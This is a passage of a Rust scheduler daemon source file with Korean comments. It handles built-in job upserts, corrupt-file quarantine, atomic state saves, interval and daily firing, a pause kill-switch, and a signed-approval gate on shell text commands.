                //   **덮지 않고 conflict 로 보고**한다.
                if let Some(want_action) = bj.get("action").and_then(|v| v.as_str()) {
                    let cur_action = jobs[pos].get("action").and_then(|v| v.as_str());
                    if want_action == ACTION_PUSH_QUEUED && cur_action != Some(want_action) {
                        if cur_action == Some("push") {
                            if let Some(o) = jobs[pos].as_object_mut() {
                                o.insert("action".into(), serde_json::json!(want_action));
                                o.insert("via_queue".into(), serde_json::json!(true));
                            }
                            changed = true;
                            eprintln!(
                                "[cysd] ensure_builtin_jobs: '{id}' 의 action 을 '{want_action}' 로 이관 — 큐 경유가 이 잡의 계약이다(직접 주입 차단)"
                            );
                        } else {
                            // ★(triage X13 · 수렴 R2) 이것은 **id 선점이 아니다** — 우리 잡인데
                            //   운영자가 action 을 고쳤다. 사유를 갈라 담아야 호출부가 맞는
                            //   처방을 찍는다(선점 문안은 여기서 틀린 안내가 된다).
                            edited_action
                                .push((id.clone(), cur_action.unwrap_or("(없음)").to_string()));
                            eprintln!(
                                "[cysd] ensure_builtin_jobs: '{id}' 의 action 이 '{}' 로 편집돼 있다 — 이관하지 않는다(운영자 편집 보존). 큐 경유가 필요하면 action 을 '{want_action}' 로 두라.",
                                cur_action.unwrap_or("(없음)")
                            );
                        }
                    }
                }
                let cur_ver = jobs[pos].get("_builtin_version").and_then(|v| v.as_u64());
                if cur_ver != Some(want_ver) {
                    // [가청화 · 2026-08-20] 버전 교체는 기존 항목을 코드 정의로 **통째** 덮는다 —
                    // 운영자가 command/every_minutes 등을 손으로 고쳐 둔 경우 그 편집이 무언
                    // 소실되는 지점이다(파일 채널(STATE_DIR/mode) 밖의 잡 문자열 편집은 여기서
                    // 살아남지 못한다 — builtin_jobs() 상단 B3 주석과 같은 기제). 로직은 불변
                    // (교체는 그대로) — 소실 사실만 경고 1줄로 가청화한다. 버전 필드 차이는
                    // 갱신의 정의 자체라 비교에서 제외한다.
                    let strip = |v: &serde_json::Value| {
                        let mut c = v.clone();
                        if let Some(o) = c.as_object_mut() {
                            o.remove("_builtin_version");
                        }
                        c
                    };
                    if strip(&jobs[pos]) != strip(&bj) {
                        eprintln!(
                            "[cysd] ensure_builtin_jobs: built-in 잡 '{id}' 버전 교체 — 기존 항목이 코드 정의와 달라 그 편집이 소실됩니다(구 항목: {})",
                            jobs[pos]
                        );
                    }
                    jobs[pos] = bj; // built-in 구버전 → 갱신
                    changed = true;
                }
                // 존재+동버전 = 무접촉(중복 생성 0)
            }
            None => {
                jobs.push(bj); // 부재 → 생성
                changed = true;
            }
        }
    }
    (changed, conflicts, edited_action)
}

/// ★B2-1(W3): 데몬 부트 시 built-in phoenix 잡을 schedule.json 에 idempotent 하게 보장한다. schedule.json 은
/// user-owned(사용자 `cys schedule add` 잡 보존)이라 팩 배달로는 built-in 잡을 갱신할 수 없다 — 코드가 upsert 한다.
/// 파일 부재=빈 골격 생성 · 손상(파싱 실패)=무접촉(load_jobs 의 격리 경로가 별도 처리 — 여기서 덮어써 사용자 잡을
/// 잃지 않는다) · 변경 있을 때만 원자적 재기록(핫 리로드 torn read 회피).
pub fn ensure_builtin_jobs() {
    let path = schedule_path();
    let mut root: serde_json::Value = match std::fs::read_to_string(&path) {
        Ok(c) => match serde_json::from_str(&c) {
            Ok(v) => v,
            Err(e) => {
                // 손상 — 무접촉(사용자 잡 보존 우선). load_jobs 가 격리+loud 신호를 낸다.
                eprintln!("[cysd] ensure_builtin_jobs: schedule.json 파싱 실패({e}) — 무접촉(손상은 load_jobs 격리 소관)");
                return;
            }
        },
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => json!({"jobs": []}),
        Err(e) => {
            eprintln!("[cysd] ensure_builtin_jobs: schedule.json 읽기 실패({e}) — 무접촉");
            return;
        }
    };
    if !root.is_object() {
        eprintln!("[cysd] ensure_builtin_jobs: schedule.json 최상위가 object 아님 — 무접촉");
        return;
    }
    // jobs 배열 확보(부재/비배열이면 빈 배열로 정규화 — 다른 키는 보존).
    if !root.get("jobs").map(|j| j.is_array()).unwrap_or(false) {
        root.as_object_mut()
            .unwrap()
            .insert("jobs".to_string(), json!([]));
    }
    let arr = root.get_mut("jobs").and_then(|j| j.as_array_mut()).unwrap();
    // ★(triage X8) 저장된 표현도 같은 정규형으로 접는다 — 메모리에서만 접으면 **파일**은 여전히
    //   `action:"push"` 라 강등된 구 데몬이 그것을 직접 주입한다(이 정규화의 목적 그 자체).
    let normalized = canonicalize_stored_queue_actions(arr);
    if normalized {
        // ★(triage X8 minor · 수렴 R2) 조용한 파일 수정은 관측 소실이다 — 무엇을 접었는지 남긴다.
        eprintln!(
            "[cysd] ensure_builtin_jobs: 저장된 'action:\"push\" + via_queue:true' 를 '{ACTION_PUSH_QUEUED}' 로 접었다(뜻 보존 · 강등된 구 데몬이 직접 주입하지 못하게)"
        );
    }
    let (bchanged, preempted, edited_action) = apply_builtin_jobs(arr);
    let changed = normalized || bchanged;
    for id in &preempted {
        eprintln!(
            "[cysd] ensure_builtin_jobs: 사용자 잡이 예약 id '{id}' 를 선점 — built-in 갱신 skip(사용자 잡 보존). \
             built-in 기능을 원하면 사용자 잡을 다른 id 로 옮기라."
        );
    }
    for (id, cur) in &edited_action {
        // ★(triage X13 · 수렴 R2) 선점이 아니다 — id 는 우리 것이고 운영자가 action 만 고쳤다.
        eprintln!(
            "[cysd] ensure_builtin_jobs: built-in 잡 '{id}' 의 action 이 '{cur}' 로 편집돼 있다 — 덮지 않는다(운영자 편집 보존). \
             이 잡의 큐 경유가 필요하면 action 을 '{ACTION_PUSH_QUEUED}' 로 되돌리라(id 는 그대로 두라)."
        );
    }
    if changed {
        if write_schedule_atomic(&path, &root) {
            eprintln!("[cysd] ensure_builtin_jobs: built-in phoenix 잡 보장(생성/갱신) 완료");
        } else {
            eprintln!("[cysd] ensure_builtin_jobs: schedule.json 원자쓰기 실패");
        }
    }
}

fn state_path(daemon: &Daemon) -> PathBuf {
    state_dir(&daemon.socket_path).join("schedule_state.json")
}

/// 손상 영속 파일 격리 — 조용히 기본값으로 덮어쓰지 않고 `<name>.corrupt-<epoch>`로 옮긴다.
/// 데이터 보존 + 복원 가능 + loud 신호(호출부 eprintln). rename 성공 시 백업 경로를 반환한다.
/// 부재 파일(첫 가동)은 정상이므로 격리 대상이 아니다 — 호출부가 NotFound를 먼저 분기한다.
fn quarantine_corrupt(path: &std::path::Path) -> Option<PathBuf> {
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    let backup = path.with_file_name(format!("{name}.corrupt-{}", now_epoch() as u64));
    std::fs::rename(path, &backup).ok().map(|_| backup)
}

pub fn load_jobs() -> Vec<Job> {
    let path = schedule_path();
    let content = match std::fs::read_to_string(&path) {
        Ok(c) => c,
        // 부재 = 정상(스케줄 미설정). 빈 스케줄로 조용히 진행한다.
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Vec::new(),
        Err(e) => {
            eprintln!(
                "[cysd] schedule.json 읽기 실패({}): {e} — 빈 스케줄로 진행",
                path.display()
            );
            return Vec::new();
        }
    };
    // 존재하나 파싱 불가 = 데이터 손상. 조용히 빈 스케줄로 대체하면 24/365 데몬의 전 하트비트가
    // 신호 0으로 소실된다(헌장 복원 불변식 모순). 손상본을 격리하고 loud 신호를 남긴다.
    let mut root: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            let note = match quarantine_corrupt(&path) {
                Some(b) => format!("손상본을 {}로 격리(데이터 보존)", b.display()),
                None => "손상본 격리 실패".to_string(),
            };
            eprintln!("[cysd] schedule.json 파싱 실패: {e} — {note}; 빈 스케줄로 진행");
            return Vec::new();
        }
    };
    // ★(수렴 R2 · triage X8 잔여) **핫리로드도 파일을 접는다.** 종전에는 아래 serde 계층이
    //   메모리의 `Job` 만 정규화했고(`canonicalize_queue_action`), 디스크는 운영자가 손으로 넣은
    //   구 표현 그대로였다 — 그 표현이 강등된 구 데몬의 직접 주입 통로다. 멱등이라 바뀔 것이
    //   없으면 파일을 건드리지 않는다(매 틱 쓰기 없음).
    canonicalize_schedule_file(&path, &mut root);
    match root.get("jobs") {
        None => Vec::new(), // jobs 키 부재 = 빈 스케줄(정상)
        Some(j) => match serde_json::from_value::<Vec<Job>>(j.clone()) {
            Ok(v) => v,
            Err(e) => {
                // root는 유효 JSON이나 jobs 스키마 불일치 — 전체 격리는 않되(다른 키 보존 가능)
                // loud 신호로 무음 소실을 막는다. 스키마 점검이 필요한 운영 신호.
                eprintln!(
                    "[cysd] schedule.json 'jobs' 역직렬화 실패: {e} — 빈 스케줄(스키마 점검 필요)"
                );
                Vec::new()
            }
        },
    }
}

fn load_state(daemon: &Daemon) -> ScheduleState {
    let path = state_path(daemon);
    let content = match std::fs::read_to_string(&path) {
        Ok(c) => c,
        // 부재 = 정상(최초 가동). 기본 상태로 시작한다.
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return ScheduleState::default(),
        Err(e) => {
            eprintln!(
                "[cysd] schedule_state.json 읽기 실패({}): {e} — 기본 상태로 진행",
                path.display()
            );
            return ScheduleState::default();
        }
    };
    match serde_json::from_str::<ScheduleState>(&content) {
        Ok(s) => s,
        Err(e) => {
            // 손상 fire-state를 조용히 default로 대체하면 last_fired 소실 → 전 job 재발화.
            // 격리 + loud로 운영자가 인지하게 한다(재발화는 보고성 job엔 무해하나 신호는 남긴다).
            let note = match quarantine_corrupt(&path) {
                Some(b) => format!("손상본을 {}로 격리", b.display()),
                None => "손상본 격리 실패".to_string(),
            };
            eprintln!("[cysd] schedule_state.json 파싱 실패: {e} — {note}; 기본 상태로 진행");
            ScheduleState::default()
        }
    }
}

/// ★★디스크가 죽어도 **간격 의미를 지키는** 프로세스 메모리 오버레이(감사 확정 2026-08-16).
///
/// 왜 필요한가 — 스케줄러의 모든 안전성은 `schedule_state.json` 영속에 걸려 있었다. 쓰기가
/// 지속 실패하면(디스크 가득참·쿼터·읽기전용·권한) 매 tick 이 "처음"으로 보여 두 파국 중
/// 하나로 간다:
///   ①`last_fired` 가 영원히 비어 전 주기 잡이 **30초마다 재발화** → 마스터 stdin 폭주(앵커 ①②)
///   ②반쪽 쓰기(0바이트·잘림)가 남으면 손상 격리→재시드 루프로 **어느 잡도 영영 발화 안 함**(앵커 ③)
/// 어느 쪽도 허용할 수 없다. 그래서 발화 시각을 **메모리에도** 남기고, 매 tick 디스크 상태 위에
/// 덮어쓴다. 디스크가 정상이면 아무것도 달라지지 않고(같은 값), 죽어 있으면 이 프로세스가 사는
/// 동안 정확한 간격이 유지된다. 데몬 재시작 시 초기화되는 것은 의도된 한계다(그때는 디스크가
/// 유일한 진실이며, 재시작은 드물다).
fn mem_last_fired() -> &'static std::sync::Mutex<HashMap<String, i64>> {
    static MEM: std::sync::OnceLock<std::sync::Mutex<HashMap<String, i64>>> =
        std::sync::OnceLock::new();
    MEM.get_or_init(|| std::sync::Mutex::new(HashMap::new()))
}

fn mem_merge_into(state: &mut ScheduleState) {
    if let Ok(m) = mem_last_fired().lock() {
        for (k, v) in m.iter() {
            // 메모리가 더 최신이면 그것이 진실이다(디스크 쓰기 실패분을 복원).
            let cur = state.last_fired.get(k).copied().unwrap_or(0);
            if *v > cur {
                state.last_fired.insert(k.clone(), *v);
            }
        }
    }
}

fn mem_record(id: &str, ts: i64) {
    if let Ok(mut m) = mem_last_fired().lock() {
        m.insert(id.to_string(), ts);
    }
}

/// 상태 저장 — **원자쓰기(tmp+rename)** 로 반쪽 파일을 남기지 않는다(ensure_builtin_jobs 관례와 동일).
/// 종전 `fs::write` 는 create(성공)+write_all(실패) 사이에서 **0바이트 파일**을 남길 수 있었고,
/// 그 파일은 다음 tick 에 파싱 실패→손상 격리→재시드 루프의 씨앗이 됐다.
/// 반환값으로 성공 여부를 알린다(호출부가 '영속됐다'를 exists() 로 오판하지 않도록).
fn save_state(daemon: &Daemon, state: &ScheduleState) -> std::io::Result<()> {
    save_state_to(&state_path(daemon), state)
}

/// 경로 주입판(테스트 가능) — 위 함수의 본체.
fn save_state_to(path: &std::path::Path, state: &ScheduleState) -> std::io::Result<()> {
    let body = serde_json::to_string_pretty(state)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
    let tmp = path.with_extension("json.tmp");
    {
        use std::io::Write;
        let mut f = std::fs::File::create(&tmp)?;
        f.write_all(body.as_bytes())?;
        f.sync_all()?;
    }
    std::fs::rename(&tmp, path)
}

/// 주기 job 발화 판정 — 순수 함수(회귀 핀). 마지막 발화 후 every_minutes분 경과 시 true.
/// every_minutes None·0은 비활성(상시발화 방지). last_fired=0(최초)는 epoch 차가 커 즉시 발화.
fn interval_due(every_minutes: Option<u64>, last_fired: i64, now_ts: i64) -> bool {
    match every_minutes {
        // ★미래 last_fired 방어(감사 확정): 첫 부팅이 시각 동기화 전이라 벽시계가 미래로 튀면
        // 그 값이 박제되고, 시각이 교정된 뒤에는 `now - last` 가 영원히 음수라 **주기 잡이
        // 영구 침묵**한다. 미래 기록은 신뢰할 수 없으므로 즉시 만기로 취급해 리듬을 되찾는다.
        Some(m) if m > 0 => last_fired > now_ts || now_ts - last_fired >= (m as i64) * 60,
        _ => false,
    }
}

/// 해당 날짜가 job의 실행 요일인가 + 그 날짜의 예정 시각(epoch)을 계산.
/// DST 모호/비존재 시각은 earliest로 보정 — 해당일 job이 무음 소멸하지 않는다.
fn schedule_for(job: &Job, date: chrono::NaiveDate) -> Option<i64> {
    if !job.days.is_empty() {
        let dow = match date.weekday() {
            chrono::Weekday::Mon => "mon",
            chrono::Weekday::Tue => "tue",
            chrono::Weekday::Wed => "wed",
            chrono::Weekday::Thu => "thu",
            chrono::Weekday::Fri => "fri",
            chrono::Weekday::Sat => "sat",
            chrono::Weekday::Sun => "sun",
        };
        if !job.days.iter().any(|d| d.eq_ignore_ascii_case(dow)) {
            return None;
        }
    }
    let t = NaiveTime::parse_from_str(job.time.as_deref()?, "%H:%M").ok()?;
    let dt = date.and_time(t);
    let local = Local.from_local_datetime(&dt);
    local
        .single()
        .or_else(|| local.earliest())
        .map(|d| d.timestamp())
}

pub fn spawn_scheduler(daemon: Arc<Daemon>) {
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(TICK_SECS)).await;
            // 패닉 격리: 한 틱의 패닉이 scheduler 태스크를 죽여 하트비트 발화가
            // 데몬 수명 내내 조용히 멈추는 것을 막는다. (fire는 별도 태스크라 자체 격리)
            let tick = std::panic::AssertUnwindSafe(|| scheduler_tick(&daemon));
            if std::panic::catch_unwind(tick).is_err() {
                daemon.bus.publish(
                    "schedule.tick_panic",
                    "schedule",
                    None,
                    json!({"note": "scheduler tick panicked; continuing next tick"}),
                );
            }
        }
    });
}

/// scheduler 루프의 동기 틱 본문 — 패닉 격리 경계 안에서 호출된다.
fn scheduler_tick(daemon: &Arc<Daemon>) {
    // T4-15 kill-switch: pause 중에는 발화 동결 (재개 후 600초 초과분은 missed 처리)
    if daemon.paused.load(std::sync::atomic::Ordering::Relaxed) {
        return;
    }
    let jobs = load_jobs(); // 핫 리로드: CLI가 schedule.json만 고치면 됨
    if jobs.is_empty() {
        return;
    }
    let now = Local::now();
    let now_ts = now.timestamp();
    let mut state = load_state(daemon);
    state.schema_version = SCHEDULE_STATE_VERSION; // 구파일(0) → 현재 버전 스탬프(다음 save 시 영속)
    // ★디스크 쓰기가 실패해도 간격을 지키도록 메모리 기록을 먼저 덮는다(mem_last_fired 주석 참조).
    mem_merge_into(&mut state);
    let mut dirty = false;
    // ★P2-2 ⑥(완전 초기화 시뮬레이션 확정 2026-08-16): 상태 파일이 **없는 첫 가동**(신규 설치·
    // 완전 초기화 직후)에는 last_fired 가 0이라 전 주기 잡의 만기가 **동시에** 성립한다. 그러면
    // ①마스터가 있으면 6h·24h·주간 잡이 한꺼번에 주입돼 갓 각성한 마스터를 큐로 덮치고(폭주 결함군)
    // ②마스터가 없으면 `if_absent: skip` 으로 전부 소인돼 다음 주기까지 침묵한다 — 어느 쪽도 의도가
    // 아니다. 첫 가동에는 시계를 **지금**으로 맞춰 다음 주기부터 정상 리듬을 타게 한다.
    // 실패 방향: 첫 주기 1회가 늦어질 뿐(보고성 잡이라 무해). 상태 파일이 있으면 전혀 관여하지 않는다.
    // ★★fail-safe 방향 고정(부트 체인 불가침): 시드를 **디스크에 남기지 못하면 채택하지 않는다**.
    // 이 순서가 계약인 이유 — 시드를 메모리에만 적용하고 save_state 가 실패하면(디스크 가득참·
    // 권한·경로 소실) 매 tick 이 다시 "첫 가동"으로 보여 last_fired 가 영원히 now 로 리셋되고,
    // 그러면 **주기 자가치유 잡이 영영 발화하지 않는다**(무발화 침묵 = 마스터가 바보가 되는 그 결함).
    // 저장 실패 시에는 종전 의미(last_fired=0 → 즉시 만기)로 되돌린다: 잡이 한 번에 몰리는 쪽이
    // 영원히 안 도는 쪽보다 **압도적으로 덜 위험하다**(전자는 시끄럽고 후자는 조용히 죽는다).
    // ★손상 격리를 '첫 가동'으로 오인하지 않는다(감사 확정): load_state 가 손상본을
    // `<name>.corrupt-<epoch>` 로 rename 하면 원본 자리가 비어 '처음'처럼 보인다. 그 상태에서
    // 시드하면 **몇 달 된 기계의 전 주기 잡 시계가 통째로 리셋**되고 로그도 거짓말을 한다.
    // 격리 흔적(형제 .corrupt-* 파일)이 하나라도 있으면 첫 가동이 아니다.
    let had_corrupt = state_path(daemon)
        .parent()
        .and_then(|d| std::fs::read_dir(d).ok())
        .map(|rd| {
            rd.flatten().any(|e| {
                e.file_name()
                    .to_string_lossy()
                    .starts_with("schedule_state.json.corrupt-")
            })
        })
        .unwrap_or(false);
    if state.last_fired.is_empty() && !state_path(daemon).exists() && !had_corrupt {
        let mut seeded: HashMap<String, i64> = HashMap::new();
        for job in jobs.iter().filter(|j| j.every_minutes.is_some()) {
            // ★복구 소스를 만드는 잡(phoenix 세대 스냅샷)은 **시드하지 않는다** — 시드하면
            // 첫 6시간 동안 롤백 세대가 0이라, 그 사이 손상되면 치유 소스가 아예 없다.
            // 한 잡이 부팅 직후 1회 도는 것은 '몰림'이 아니다(동시 만기 방지가 목적이었다).
            if job.id.starts_with("phoenix-snapshot") {
                continue;
            }
            seeded.insert(job.id.clone(), now_ts);
        }
        if !seeded.is_empty() {
            // ★시드는 **메모리에 먼저** 박는다 — 디스크 성패와 무관하게 이 프로세스에서는
            // 재시드가 다시 일어나지 않는다(재시드 루프 = 주기 잡 영구 침묵의 원인).
            for (k, v) in &seeded {
                mem_record(k, *v);
            }
            state.last_fired = seeded;
            let probe = ScheduleState {
                schema_version: SCHEDULE_STATE_VERSION,
                last_fired: state.last_fired.clone(),
            };
            match save_state(daemon, &probe) {
                Ok(()) => eprintln!(
                    "[cysd] schedule: 첫 가동 — 주기 잡 {}개의 기준 시각을 now 로 초기화(동시 만기 방지)",
                    state.last_fired.len()
                ),
                Err(e) => eprintln!(
                    "[cysd] schedule: 첫 가동 시드 영속 실패({}: {e}) — 메모리 기록으로 간격을 유지한다\
                     (데몬 재시작 전까지 유효). 디스크 쓰기 문제를 해결하라.",
                    state_path(daemon).display()
                ),
            }
        }
    }
    let today = now.date_naive();
    for job in jobs {
        // 주기(every_minutes) job: 마지막 발화 후 N분 경과 시 반복 발화 (master 5분 보고 하트비트).
        // at·time보다 먼저 평가하고, 처리 후 다음 job으로 (배타).
        // 재시작 안전성: last_fired는 발화 직후 기록되고 dirty 시 save_state로 영속된다.
        // save_state 직전 비정상 종료 시 재시작 후 1회 추가 발화가 가능하나, 보고성 job은
        // 중복 발화를 허용한다(누락이 더 해롭다 — '보고가 한 번 더'는 무해).
        if job.every_minutes.is_some() {
            let last = state.last_fired.get(&job.id).copied().unwrap_or(0);
            if interval_due(job.every_minutes, last, now_ts) {
                state.last_fired.insert(job.id.clone(), now_ts);
                mem_record(&job.id, now_ts); // 디스크 실패해도 다음 tick 이 간격을 지킨다.
                dirty = true;
                let d = Arc::clone(daemon);
                let j = job.clone();
                tokio::spawn(async move { fire(d, j).await });
            }
            continue;
        }
        // T3-10 원샷(at) job: 도달 시 1회 발화 후 파일에서 제거
        if let Some(at) = job.at {
            if now_ts < at {
                continue;
            }
            if state.last_fired.get(&job.id).copied().unwrap_or(0) >= at {
                continue;
            }
            state.last_fired.insert(job.id.clone(), at);
            dirty = true;
            if now_ts - at > MISS_WINDOW_SECS {
                daemon.bus.publish(
                    "schedule.missed",
                    "schedule",
                    None,
                    json!({"job_id": job.id, "scheduled_at": at, "late_secs": now_ts - at}),
                );
            } else {
                let d = Arc::clone(daemon);
                let j = job.clone();
                tokio::spawn(async move { fire(d, j).await });
            }
            remove_job_from_file(&job.id);
            continue;
        }
        // 어제 인스턴스도 평가 — 자정 경계에서 전날 미처리분이
        // fire도 schedule.missed도 없이 무음 소멸하는 것을 막는다
        let mut dates = vec![today];
        if let Some(yesterday) = today.pred_opt() {
            dates.insert(0, yesterday);
        }
        for date in dates {
            let Some(sched_ts) = schedule_for(&job, date) else {
                continue;
            };
            if now_ts < sched_ts {
                continue;
            }
            if state.last_fired.get(&job.id).copied().unwrap_or(0) >= sched_ts {
                continue; // 이미 처리
            }
            state.last_fired.insert(job.id.clone(), sched_ts);
            dirty = true;
            if now_ts - sched_ts > MISS_WINDOW_SECS {
                daemon.bus.publish(
                    "schedule.missed",
                    "schedule",
                    None,
                    json!({"job_id": job.id, "scheduled_at": sched_ts,
                                   "late_secs": now_ts - sched_ts}),
                );
                continue;
            }
            let d = Arc::clone(daemon);
            let job = job.clone();
            tokio::spawn(async move { fire(d, job).await });
        }
    }
    if dirty {
        if let Err(e) = save_state(daemon, &state) {
            // 조용히 삼키지 않는다 — 이 실패가 지속되면 재시작 시 간격이 초기화된다.
            eprintln!("[cysd] schedule: 상태 저장 실패({e}) — 메모리 기록으로 계속 진행");
        }
    }
}

/// 원샷 잡 제거의 **순수 코어**(회귀 핀 대상).
///
/// ★(0.14.31 · 수렴 R2 · triage X8 잔여) 이 자리는 **원시 JSON 을 되쓰는** 경로다 — 남은 잡을
/// 읽은 그대로 쓰면 운영자가 손으로 넣은 `action:"push" + via_queue:true` 가 디스크에 그대로
/// 다시 영속된다(원샷 잡 하나가 끝날 때마다). 강등된 구 데몬은 그 표현을 `push` 로 읽고 큐
/// 준비 게이트를 통째 우회해 직접 주입한다. 쓰기 전에 같은 정규형으로 접는다.
fn drop_job_and_canonicalize(root: &mut serde_json::Value, job_id: &str) {
    if let Some(arr) = root["jobs"].as_array_mut() {
        arr.retain(|j| j["id"].as_str() != Some(job_id));
        canonicalize_stored_queue_actions(arr);
    }
}

/// T3-10: 처리 완료된 원샷 job을 schedule.json에서 제거 (영구 잔존 차단)
fn remove_job_from_file(job_id: &str) {
    let path = schedule_path();
    let Ok(content) = std::fs::read_to_string(&path) else {
        return;
    };
    let Ok(mut root) = serde_json::from_str::<serde_json::Value>(&content) else {
        return;
    };
    drop_job_and_canonicalize(&mut root, job_id);
    // 원자 치환 — 부분 쓰기가 핫리로드에 잡히면 스케줄 전체가 빈 스케줄로 읽힌다.
    if !write_schedule_atomic(&path, &root) {
        eprintln!("[cysd] schedule: 원샷 잡 '{job_id}' 제거 기록 실패 — 다음 틱이 다시 시도한다");
    }
}

/// 즉시 발화 (CLI `schedule run-now` — 검증용, last_fired 갱신 없음)
pub fn run_now(daemon: &Arc<Daemon>, job_id: &str) -> Result<(), String> {
    // T4-15 kill-switch: pause 중에는 즉발도 동결 — scheduler_tick과 동일한 게이트.
    // run_now는 fire()로 동일한 스케줄 발화(에이전트 stdin 주입·fresh surface 기동)를
    // 수행하므로, 이 경로만 게이트가 없으면 kill-switch가 비대칭으로 뚫린다.
    // RPC 호출이라 무음 return 대신 거절 사유를 caller에 알린다.
    if daemon.paused.load(std::sync::atomic::Ordering::Relaxed) {
        return Err("paused: kill-switch engaged (system.resume to re-enable firing)".to_string());
    }
    let job = load_jobs()
        .into_iter()
        .find(|j| j.id == job_id)
        .ok_or_else(|| format!("no job '{job_id}' in {}", schedule_path().display()))?;
    let d = Arc::clone(daemon);
    tokio::spawn(async move { fire(d, job).await });
    Ok(())
}

/// ★T9(R3-P03-3): base 전용 잡의 부서 데몬 발화 차단 판정(순수 — 회귀 핀 대상).
/// fire() 진입부가 유일 관문인 이유: scheduler_tick·run_now·핫리로드·파일 복제(부서 팩에
/// builtin 이 복제 기록되는 기지 소음) 전 경로가 fire 로 수렴한다 — ensure/seed 시점 가드로는
/// cys-dept 미경유 재기동(클라이언트 autostart)을 막지 못한다. 셸 env 가드([ -n "$CYS_SOCKET" ])
/// 는 판별자로 부적격(GUI ensure_daemon 이 base cysd 를 env_remove 없이 스폰) — 판별은
/// 데몬 자신의 socket_path(is_dept_socket) 하나다.
fn base_only_blocked(job: &Job, socket_path: &std::path::Path) -> bool {
    job.base_only && cys::is_dept_socket(socket_path)
}

async fn fire(daemon: Arc<Daemon>, job: Job) {
    // ★T9 단일 관문: base_only 잡이 부서 소켓 데몬에서 발화하려 하면 skip + 사유 이벤트 1줄.
    // (예: 상비편성 심박이 부서 데몬에서 돌면 전 부서 이중 ensure — 단일소유 위반.)
    if base_only_blocked(&job, &daemon.socket_path) {
        daemon.bus.publish(
            "schedule.skipped",
            "schedule",
            None,
            json!({"job_id": job.id, "why": "base_only job on dept socket — skip (T9/R3-P03-3)"}),
        );
        return;
    }
    let result = match job.action.as_str() {
        // ★(0.14.31 · 리뷰 R1 · codex blocking) `push_queued` 는 **큐 경유가 계약인 push** 다.
        //   `action:"push"` + `via_queue:true` 로만 표현하면 구 데몬(강등·롤백)이 미지 필드를
        //   무시하고 **직접 주입**한다 — 초안·승인 대기 화면에 글자와 Return 이 꽂힌다.
        //   구 데몬은 이 action 을 모르므로 `unknown action` 으로 **거절**한다(주입 0 · 안전 방향).
        "push" | ACTION_PUSH_QUEUED => fire_push(&daemon, &job).await,
        "command" => fire_command(&daemon, &job).await,
        other => Err(format!("unknown action '{other}'")),
    };
    match result {
        Ok(detail) => daemon.bus.publish(
            "schedule.fired",
            "schedule",
            None,
            json!({"job_id": job.id, "action": job.action, "detail": detail, "at": now_epoch()}),
        ),
        Err(e) => daemon.bus.publish(
            "schedule.error",
            "schedule",
            None,
            json!({"job_id": job.id, "error": e}),
        ),
    }
}

/// fresh surface를 발화 후 자동 close하기까지의 TTL(초)을 결정한다.
/// - close_after_secs 명시 → 그 값 우선(0 포함 — 운영자 의도 존중)
/// - 미설정 + 반복 job(time 또는 every_minutes) → 누수 차단 기본 TTL (반복 발화는 surface가
///   단조 누적되므로 회수 트리거 부재 시 자동 close 필요). at이 None인 모든 반복형에 적용된다.
/// - 미설정 + 원샷(at) job → None (1회뿐이라 무한 누적 없음 — 기존 동작 보존)
fn effective_close_ttl(job: &Job) -> Option<u64> {
    if let Some(ttl) = job.close_after_secs {
        // ★(0.14.31 · 독립 판정 triage X9) **큐 경유 배달은 준비 게이트를 기다린다.**
        //   `close_after_secs: 0` 은 그대로 `Some(0)` 이라 회수 타이머가 배달 게이트가 열리기
        //   전에 돌고, `close_surface` 는 활성 큐를 폐기한다(governance `drain_active_except_inflight`)
        //   — 적재된 일감이 배달 전에 사라진다. 큐가 계약인 잡에는 **하한**을 둔다: 회수가
        //   배달 시도보다 앞설 수 없게 만드는 최소 창이다(운영자의 0 은 "가능한 한 빨리" 이지
        //   "배달 전에" 가 아니다). 처분이 정해질 때까지의 실제 유예는 호출부가 따로 진다.
        if job.uses_queue() {
            return Some(ttl.max(QUEUED_CLOSE_MIN_TTL_SECS));
        }
        return Some(ttl);
    }
    if job.at.is_none() {
        return Some(FRESH_RECURRING_DEFAULT_TTL_SECS);
    }
    None
}

/// R-CLI-4: text_command 실행 前 게이트용 — 코드 소유 built-in 잡의 text_command와 정확히
/// 일치하는가(순수·회귀 핀). built-in 문자열이 조금이라도 변조되면 false로 떨어진다.
fn is_trusted_builtin_text_command(cmd: &str) -> bool {
    builtin_jobs()
        .iter()
        .any(|j| j.get("text_command").and_then(|v| v.as_str()) == Some(cmd))
}

/// R-CLI-4: text_command는 데몬이 셸로 실행하므로(schedule.json 편집자 = 임의 셸 실행 벡터) 실행
/// 前 게이트한다. ① 코드 소유 built-in 잡(팩·데몬 저작)의 text_command와 정확 일치 = 신뢰 허용.
/// ② 그 외(사용자·외부 주입·변조된 built-in) = 서명된 승인 레코드(approval.rs) 필요 — 부재 시
/// fail-closed 거부. 서명 시크릿 없이는 레코드 위조 불가라 무게이트 임의 셸 실행을 봉인한다.
fn text_command_allowed(cmd: &str) -> Result<(), String> {
    if is_trusted_builtin_text_command(cmd) {
        return Ok(());
    }
    let Some(secret) = crate::approval::signing_secret() else {
        return Err("text_command 승인 시크릿 부재 — 미승인 셸 실행 거부".into());
    };
    let records = crate::approval::load_records();
    let cwd = std::env::current_dir()
        .ok()
        .map(|p| p.to_string_lossy().to_string());
    if crate::approval::best_match(&records, &secret, cmd, cwd.as_deref(), &[]).is_some() {
        Ok(())
    } else {
        Err(format!(
            "미승인 text_command — built-in 아님·서명 승인 없음(임의 셸 실행 차단): {cmd}"
        ))
    }
}

/// text_command를 셸로 실행해 stdout(trim)을 반환한다 (push 텍스트 산출).
/// 결정론 환원: 진행% 같은 도구 출력을 데몬이 직접 만들어 master 앞에 놓는다.
/// 30초 타임아웃·빈 출력·비정상 종료는 에러 — 잘못된 보고가 무음 전달되지 않는다.
async fn run_text_command(cmd: &str) -> Result<String, String> {
    // R-CLI-4: 무게이트 셸 실행 차단 — built-in 신뢰 또는 서명 승인만 통과.
    text_command_allowed(cmd)?;
    // RC-11: OS별 셸 — Windows는 sh 부재라 heartbeat/report text_command job이 전부 실패했다.
    // fire_command와 동일하게 command_shell()(win=동봉 bash·미탐지 시 cmd) 사용으로 통일.
    let (sh, flag) = command_shell();
